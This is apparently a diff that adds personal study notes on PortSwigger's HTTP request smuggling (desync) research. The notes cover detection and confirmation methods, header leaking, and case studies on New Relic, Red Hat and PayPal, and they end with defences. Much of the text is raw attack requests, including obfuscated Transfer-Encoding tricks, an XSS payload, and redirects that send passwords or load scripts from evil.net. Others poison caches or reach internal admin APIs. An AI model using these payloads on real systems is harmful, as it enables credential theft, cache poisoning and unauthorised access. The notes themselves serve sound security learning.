@@ -1,0 +1,517 @@
+https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+https://www.youtube.com/watch?v=w-eJM2Pc0KI
+
+Abstract
+- Traditionally, HTTP request are viewed as isolated, standalone entities
+- Core idea: break isolation, splices their request into others
+- Possible action:
+    + Edit victim's request carefully -> route them into malicious territory, invoke harmful response, lure credentials
+    + Using BE reassembly on your own request -> exploit FE trust, gain max privilege access to internal APIs, poison web caches, compromise PayPal's login page
+- First documented in 2005 by Watchfire, but the difficulty and collateral damage left it ignored for years
+    https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
+- Research provide:
+    + New attack variants + exploitation vectors
+    + Custom open source tooling
+    + Refined methodology for reliable black-box detection, assessment and exploitation with minimal risk of collateral damage
+
+
+Core concepts:
+- HTTP/1.1 allows sending multiple request over single TCP or SSL/TLS socket
+    + Protocol is simple, HTTP requests are placed back to back
+    + Server parses headers to determine where each request end and the next start
+    + Not the same as HTTP pipelining (rarer subtype, not required for this attack)
+        https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
+- Harmless by itself, but modern web chains multiple system (CDN -> reverse proxy -> BE) over shared TCP connection:
+    + FE multiplexes requests from different user onto one BE connection
+    + If FE and BE disagree on request boundaries -> attacker can inject prefix into next user's request
+- Example: Imagine that FE prioritises the first CL header, BE prioritises the second CL
+    POST / HTTP/1.1
+    Host: example.com
+    Content-Length: 6
+    Content-Length: 5
+
+    12345GPOST / HTTP/1.1
+    Host: example.com
+    ...
+
+    + FE forward request 6 bytes (12345G) to BE, but BE only read 5 bytes -> G is gonna append to next user's request -> cause error "Unknown method GPOST"
+    + But in real life, dual CL rarely work, most system reject request with multiple CL headers
+- Attack vector (CL - TE):
+    + RFC 2616: If both Transfer-Encoding and Content-Length are present, CL must be ignored
+        https://datatracker.ietf.org/doc/html/rfc2616#section-4.4
+        + Since specification implicitly allow using both -> most server will accept that request
+        + If we can hide TE from one server -> fall back to CL -> can desynchronize the whole system
+        + Chunked encoding system: (Transfer-Encoding)
+            <chunk size in hex>\r\n
+            <chunk data>\r\n
+        + Example:
+            5\r\n
+            Hello\r\n
+            0\r\n
+            \r\n
+- CL.TE:
+    + FE uses CL to determine body length
+    + BE parses chunk, hit 0 chunked -> end of request, leftover bytes = prefix
+    + Work when FE doesn't support chunked and BE support chunked
+    + Example:
+        POST / HTTP/1.1
+        Host: example.com
+        Content-Length: 6\r\n
+        Transfer-Encoding: chunked\r\n
+        \r\n
+        0\r\n
+        \r\n
+        GPOST / HTTP/1.1
+        Host: example.com
+- TE.CL:
+    + FE parses chunk, hit 0 chunked -> end of request, forward everything
+    + BE uses CL (smaller bytes than actual) -> only read part of body, leftover = prefix
+    + Work when FE support chunked and BE only work with CL
+    + Example:
+        POST / HTTP/1.1
+        Host: example.com
+        Content-Length: 3\r\n
+        Transfer-Encoding: chunked\r\n
+        \r\n
+        6\r\n
+        PREFIX\r\n
+        0\r\n
+        \r\n
+        POST / HTTP/1.1
+        Host: example.com
+- TE.TE (obfuscated Transfer-Encoding):
+    + Both FE + BE support TE, but one fail to parse a malformed TE header and fall back to CL
+    + Obfuscate technique:
+        + Transfer-Encoding: xchunked           (wrong value)
+        + Transfer-Encoding : chunked           (space before colon)
+        + Transfer-Encoding: chunked            (duplicate header)
+          Transfer-Encoding: x
+        + Transfer-Encoding: chunked            (duplicate header but e is normal)
+          Transfer-encoding: cow
+        + Transfer-Encoding:[tab]chunked        (Tab instead of space)
+        + GET / HTTP/1.1                        (Leading space)
+            Transfer-Encoding: chunked
+        + X: X\n                                (replace \r\n with \n)
+          Transfer-Encoding: chunked
+        + Transfer-Encoding\r\n : chunked       (line wrapped)
+        + More techniques: https://regilero.github.io/tag/Smuggling/
+
+
+Methodology:
+- Request smuggling theory is simple, but hard to exploit reliably due to uncontrolled variables and zero visibility behind FE
+- Detect --> Confirm --> Explore --> Store
+                                 --> Attack
+    + Detect: find desync
+    + Confirm: prove socket poisoning is possible
+    + Explore: gathering information (hidden headers, internal routing)
+    + Store/Attack: exploit (capture victim data, or trigger harmful response)
+
+
+Detect:
+- Naive approach: send ambiguous request from attacker + normal victim request, check if victim receive unexpected response
+    + Problem 1: on live site, other user may hit poisoned socket first -> they get corrupted response, attacker misses the signal
+    + Problem 2: even on site with no other traffic, application-level quirk may terminate connection -> false negative
+- Idea: use sequence of messages which make BE hang and time out the connection (wait for data that never come). Few false positive, can resist app quirks, virtually no risk to other users
+- Example 1: assume that is CL.TE
+    POST /about HTTP/1.1
+    Host: example.com
+    Transfer-Encoding: chunked
+    Content-Length: 4
+
+    1\r\n
+    Z\r\n
+    Q
+    + FE forward '1\r\nZ' only
+    + BE parse chunk of size 1 'Z', then wait for next chunk size or \r\n to end the chunk data, but next chunk never arrive -> timeout
+- Example 2: assume that is TE.CL
+    POST /about HTTP/1.1
+    Host: example.com
+    Transfer-Encoding: chunked
+    Content-Length: 6
+
+    0\r\n
+    \r\n
+    X
+    + FE forward '0\r\n\r\n'
+    + BE expect 6 bytes, but only get 5 bytes -> wait for 1 more bytes that never arrive -> timeout
+    + If desync happen in type CL.TE -> would poison BE socket with 'X' -> harming other users
+        -> Should run prior method (CL.TE) first to rule out that possibility
+- Burp Suite extension: https://github.com/portswigger/http-request-smuggler
+- Note: different endpoint on single domain are often routed to different destination (possibly different BE language) -> should repeat apply to every endpoint individually
+
+Confirm:
+- Goal: prove BE socket poisoning is possible
+    + Detect only prove desync exist without side effect -> now need visible proof for report
+- Method: send ambiguous request to poison socket, then send victim request, if victim get unexpected response -> confirm vuln
+- Tip to avoid breaking attack:
+    + If first request cause error to BE system -> may close the connection, discarding the poisoned buffer, breaking the attack
+    + Target endpoint that accept POST
+    + Preserving any expected GET/POST param
+    + Attack and victim request should as similar as possible (same method, path, headers), cuz FE may route different request to different BE
+- Example 1: CL.TE socket poison
+    POST /search HTTP/1.1
+    Host: example.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 53
+    Transfer-Encoding: zchunked
+
+    17
+    =x&q=smuggling&x=
+    0
+
+    GET /404 HTTP/1.1
+    Foo: bPOST /search HTTP/1.1
+    Host: example.com
+
+    + FE forward everything (include prefix for next request)
+    + BE read TE -> parse chunk, prefix (GET /404) stay in socket -> next victim would get 404
+- Example 2: TE.CL socket poison
+    POST /search HTTP/1.1
+    Host: example.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: zchunked
+
+    96
+    GET /404 HTTP/1.1
+    X: x=1&q=smugging&x=
+    Host: example.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 100
+
+    x=
+    0
+    + FE forward everything
+    + BE read 4 bytes '96\r\n', all bytes leftover will be prefix
+    + Prefix need to specify all header (treat victim request as body), and CL must be slightly larger than body
+    + 0x96 (hex) = 150 bytes
+    + Python: 
+        + int('96', 16) => 150
+        + hex(150) => '0x96'
+- On live site: other users may hit poisoned socket before your request -> attack fail
+    + Need many attempts on high-traffic sites
+    + Target only staging server where possible
+
+Explore:
+- Goal: gather information about hidden FE headers to launch a well-informed attack
+- Problem:
+    + Normal request: Client --> FE add header --> BE receive
+    + Smuggled request: Prefix that we add in socket --> BE missing header --> error/reject/redirect/unexpected behavior
+    + FE often append or rewrite headers (such as X-Forwarded-Host, X-Forwarded-For, custom internal headers)
+- Solution: reveal hidden headers via reflected param
+    + Find page that reflect POST param
+    + Put reflected param last in body
+    + Increase CL slightly beyond actual body -> victim request will append into param value
+        + If too large -> timeout
+        + If too small -> can't retrieve full victim hidden headers
+    + Victim send request -> FE rewrite headers and append to attacker request -> page reflect param and leak all internal headers
+- Example:
+    + Request:
+        POST / HTTP/1.1
+        Host: login.newrelic.com
+        Content-Length: 142
+        Transfer-Encoding: chunked
+        Transfer-Encoding: x
+
+        0
+
+        POST /login HTTP/1.1
+        Host: login.newrelic.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 100
+
+        login[email]=asdf
+    + Response:
+        <input id="email" value="asdfPOST /login HTTP/1.1
+        Host: login.newrelic.com
+        X-Forwarded-For: 81.139.39.150
+        X-Forwarded-Proto: https
+        X-TLS-Bits: 128
+        X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+        X-TLS-Version: TLSv1.2
+        x-nr-external-service: external
+- Some system completely rely on FE system for security
+    + Example: login.newrelic.com site
+        + BE system was a proxy itself -> change smuggled Host header grant access to different systems (login.newrelic.com -> staging-alerts.newrelic.com internal system)
+        + Request 1: Check behavior
+            GET / HTTP/1.1
+            Host: staging-alerts.newrelic.com
+            -------------------
+            HTTP/1.1 301 Moved Permanently
+            Location: https://staging-alerts.newrelic.com/
+        + Request 2:  add X-Forwarded-Proto header to bypass redirect filter (if not it'll implicitly think that Host header is using http)
+            GET / HTTP/1.1
+            Host: staging-alerts.newrelic.com
+            X-Forwarded-Proto: https
+            -------------
+            HTTP/1.1 404 Not Found
+            Action Controller: Exception caught 
+        + Request 3: Content discovery, found exist path
+            GET /revision_check HTTP/1.1
+            Host: staging-alerts.newrelic.com
+            X-Forwarded-Proto: https
+            ---------------
+            HTTP/1.1 200 OK
+            Not authorized with header:
+        + Request 4: Try some custom headers that leaked
+            GET /revision_check HTTP/1.1
+            Host: staging-alerts.newrelic.com
+            X-Forwarded-Proto: https
+            X-nr-external-service: 1
+            --------------
+            HTTP/1.1 403 Forbidden
+            Forbidden
+            + When not include this header, BE doesn't see "external" marker -> think that from internal network
+            + But when include, BE know that request come from external -> 403 Forbidden
+            + This was very educational, but not useful
+        + Request 5: Full access to internal API
+            + At this point, we could apply the processed-request-reflection technique to a range of endpoints until found one that had the right request header
+            + Instead of that, James Kettle decided to use header from his previous research that he had compromised site
+                POST /internal_api/934454/session HTTP/1.1
+                Host: alerts.newrelic.com
+                X-Forwarded-Proto: https
+                Service-Gateway-Account-Id: 934454
+                Service-Gateway-Is-Newrelic-Admin: true
+                Content-Length: 6
+                
+                x=123
+                ----------------
+                HTTP/1.1 200 OK
+                {
+                    "user": {
+                        "account_id": 934454,
+                        "is_newrelic_admin": true
+                    },
+                    "current_account_id": 934454
+                }
+
+Exploit:
+- Not limit to internal API access, can also attack other users browsing website
+- To know which attack can apply to other users, need to understand what type of request we can poison
+- Repeat socket poisoning test from confirm stage, but tweak victim request until it resemble typical GET 
+- Try issuing victim request from a different IP address
+- Check if it uses web cache, can help bypass restriction
+
+Store:
+- If web support editing or storing text data:
+    + Prefix victim's request with a crafted storage request -> make application save request and display back to us (treat victim's request as value of param reflect on page, like in profile or comment)
+    + Can steal any authentication cookies/headers
+    + But this technique lose data after & -> hard to steal body from form-encoded POST request
+
+Attack:
+- 2 ways of trigger harmful response:
+    + Simplest is to issue attack request, then wait for other users hit poisoned socket and trigger it
+    + Trickier but more powerful is to issue both attack and victim ourselves, hope that response get cached and serve to other users
+- Upgrading XSS:
+    + Reflect XSS is nice by itself, but tricky to exploit cuz require user-interaction
+    + With request smuggling, can make prefix request contain XSS get served to random user, enable mass-exploitation
+        -> Can get access to authentication headers and HTTP only cookies, may be let pivot to other domain
+    + Example:
+        POST / HTTP/1.1
+        Host: saas-app.com
+        Content-Length: 4
+        Transfer-Encoding : chunked
+
+        10
+        =x&cr={creative}&x=
+        66
+        POST /index.php HTTP/1.1
+        Host: saas-app.com
+        Content-Length: 200
+
+        SAML=a"><script>alert(1)</script>
+- Grasping the DOM:
+    + Some JS on the page was reading 'redir' param from query string
+        <script>
+        var destination = getQueryParam('redir')
+        [poor filtering]
+        document.location = destination
+    + Problem: request smuggling only give us control over what server sees as query string, but can't directly control DOM-read param (url in victim's browser)
+    + Solution: chaining server-side non-open redirect
+    + Example: victim go to /en/solutions
+        + /search?dest={path} -> redirect to path, redir act as param in redirect location
+        POST /css/style.css HTTP/1.1
+        Host: www.redhat.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 122
+        Transfer-Encoding: chunked
+
+        0
+
+        POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1
+        Host: www.redhat.com
+        Content-Length: 15
+
+        x=GET /en/solutions HTTP/1.1
+        Host: www.redhat.com
+        ---------------------------------
+        HTTP/1.1 301 Found
+        Location: ../assets/idx?redir=//redhat.com@evil.net/
+- CDN Chaining:
+    + Some web use multiple layers of reverse proxies and CDNs
+    -> Extra opportunities for desynchronization and increase the severity
+    + Can serve any file content from other web has same network (meaning request is being route to different site and return its content)
+    + Example 1: random web using 2 layer of Akamai
+        + Client -> Akamai layer 1 -> Akamai layer 2 -> Origin
+        + First vuln: both reverse proxy layer is Akamai but may have different config and can desync
+        + Second vuln: smuggled Host header can serve file content from anywhere on Akamai network on victim's site
+        POST /cow.jpg HTTP/1.1
+        Host: redacted.com 
+        Content-Type: application/x-www-form-urlencoded 
+        Content-Length: 50 
+        Transfer-Encoding: chunked 
+
+        0 
+
+        GET / HTTP/1.1 
+        Host: www.redhat.com 
+        X: XGET...
+    + Example 2: same concept work on SaaS providers, able to exploit a critical web by serving file content from different system built on same platform (same SaaS provider)
+- 'Harmless' responses:
+    + Vuln 1: Open redirect (hijack JS import)
+        + Normal redirect: load page -> import JS file -> receive file content
+        + Smuggling + redirect: load page -> import JS file -> fetch file content from attacker server
+        + Example:
+            POST /libs/analytics.js HTTP/1.1
+            Host: target.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 67
+            Transfer-Encoding: chunked
+
+            0
+
+            GET /redirect?url=https://evil.net/malicious.js HTTP/1.1
+            X: XGET /libs/analytics.js HTTP/1.1
+            Host: target.com
+            -------------------------
+            HTTP/1.1 302 Found
+            Location: https://evil.net/malicious.js
+    + Vuln 2: Redirect using 307 code (steal password)
+        + Status code 301/302 -> redirect to location but change post to get (can't see password)
+        + Status code 307 -> resend POST to the new destination
+            Send POST request -> 307 with Location: https://evil.net/ -> Keep method + body to resend POST request to https://evil.net/
+        -> Can make victim send their plaintext password to attacker's site
+        + Example: /redirect?url=https://evil.net/ or any path that return 307
+            POST /login HTTP/1.1
+            Host: target.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 53
+            Transfer-Encoding: chunked
+
+            0
+
+            GET /redirect?url=https://evil.net/ HTTP/1.1
+            X: XPOST /login HTTP/1.1
+            Host: target.com
+            Content-Type: application/x-www-form-urlencoded
+
+            username=admin&password=S3cretP@ss!
+            -----------------------
+            HTTP/1.1 307 Temporary Redirect
+            Location: https://evil.net/
+    + Vuln 3: Folder redirect (Missing trailing slash)
+        + Some case, if try to access folder without trailing slash -> server respond with 301 redirect to append slash and use Host header as destination domain
+            + Default behaviour in both Apache and IIS that can happen
+        + Notice the protocol used in redirect, if it is HTTP and target site is HTTPS -> will be blocked by mixed content
+            + May have to use X-Forwarded-SSL to change to HTTPS connection
+            + Other case of this:
+                https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning
+        + Example:
+            POST /etc/libs/xyz.js HTTP/1.1
+            Host: redacted
+            Content-Length: 57
+            Transfer-Encoding: chunked
+
+            0
+
+            POST /etc HTTP/1.1
+            Host: burpcollaborator.net
+            X: XGET /etc/libs/xyz.js HTTP/1.1
+            ----------------------------
+            HTTP/1.1 301 Moved Permanently
+            Location: https://burpcollaborator.net/etc/
+- Web Cache Poisoning:
+    + After few hours of trying redirect-based attack, Kettle open console and notice error request that occur everytime website is loaded, and IP look familiar
+        GET https://52.16.21.24/ net::ERR_CERT_COMMON_NAME_INVALID
+        + This is IP of Burp Collaborator
+        + During testing redirect behavior by timeout-based, someone else's request for image file had slipped before victim request and accidentally cached that response
+    + To minimum risk:
+        + Ensure victim's request have cachebuster
+        + Send victim's request as fast as possible (using Turbo Intruder)
+        + Try to craft prefix trigger response with anti-caching headers, or status code that unlikely to be cached
+        + Target FE in geographic region that's sleep
+- Web Cache Deception++:
+    + Instead of cause harmful response, we could fetch response that contain sensitive info with victim's cookie:
+        + User requests for static resource hit poisoned socket
+        -> Response contain sensitive info will be cached (with path is static resource, but content is from response of prefix request)
+        + Advantage: does not require any user-interaction like traditional web cache deception
+        + Disadvantage: attacker don't know which static resource will append to request
+    + Example: this response will be cached and attacker can easily access by typing that path
+        POST / HTTP/1.1
+        Transfer-Encoding: blah
+
+        0
+
+        GET /account/settings HTTP/1.1
+        X: XGET /static/site.js HTTP/1.1
+        Cookie: sessionid=xyz
+- PayPal: (case study)
+    + Step 1: Hijack JS file + cache poisoning
+        + PayPal login page import JS from CDN
+            <script src="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js"></script>
+        + Payload:
+            --------------------------
+            POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
+            Host: c.paypal.com
+            Content-Length: 61 
+            Transfer-Encoding: chunked
+
+            0
+
+            GET /webstatic HTTP/1.1
+            Host: skeletonscribe.net?
+            X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
+            Host: c.paypal.com
+            Connection: close
+            --------------------------
+            HTTP/1.1 302 Found
+            Location: http://skeletonscribe.net?, c.paypal.com/webstatic/
+            --------------------------
+            + /webstatic is missing trailing slash -> Redirect to /webstatic/
+            + Prefix Host header: point to attacker's server with ? at the end
+            + Victim's Host header: c.paypal.com appears as second Host header
+            + Server concat both Host values with comma
+                -> May cause redirect to attacker's server at / path and treat second Host header + redirect path as query string that will be ignored later
+                -> Serving malicious JS
+            + Cache saves redirect response content under JS file path
+                -> All users load login page will be poisoned
+        + Problem: web is using CSP with script-src (limit domain that allowed to load JS resource), so it only allow redirect to domain that listed in whitelist, other will be blocked
+    + Step 2: Bypass CSP via iframe chain
+        + Notice that login page load sub-page on c.paypal.com in a dynamically generated iframe
+            <iframe src="https://c.paypal.com/sub-page"></iframe>
+            + This sub-page doesn't use CSP and also imported our JS file in step 1
+            -> Full control over iframe via JS file
+        + Problem: can't read password thanks to the Same Origin Policy
+            Parent:  https://www.paypal.com/signin
+            Iframe:  https://c.paypal.com/sub-page
+            + Login form stand in parent page, but we can only control iframe 
+        + Solution: JS redirect iframe to paypal.com/us/gifts
+            + This also has no CSP and also import poisoned JS file
+            + Same Origin as login page -> parent.document accessible -> can steal plaintext password from everyone who logged in using Safari or IE
+    + PayPal patch:
+        + Config Akamai to reject request that contain TE header (Kettle awarded $18.9k bounty)
+        + Weeks later, Kettle try new desynchronization technique, line-wrapped TE header -> invisible to Akamai and awarded $20k bounty
+
+
+Defence:
+- No load balancers/CDNs/reverse proxies -> no vuln. More layers -> more risk
+- HTTPS does NOT prevent this attack
+- Should:
+    + FE use HTTP/2 exclusively to communicate with BE
+    + Disable BE connection reuse entirely
+    + Ensure all servers in chain run same software with same config
+- FE side: should normalize ambiguous request before routing them (only realistic solution for CDNs, Cloudflare and Fastly did that successfully)
+- BE side: reject ambiguous requests + drop connection (riskier - may affect legitimate traffic)
+- Trap when testing smuggling attack:
+    + Most tools auto-correct CL header -> In Burp, disable in Repeater menu
+    + Some companies, bug bounty platform route tester traffic through proxies for monitoring purposes -> mangles any smuggling attack -> zero coverage
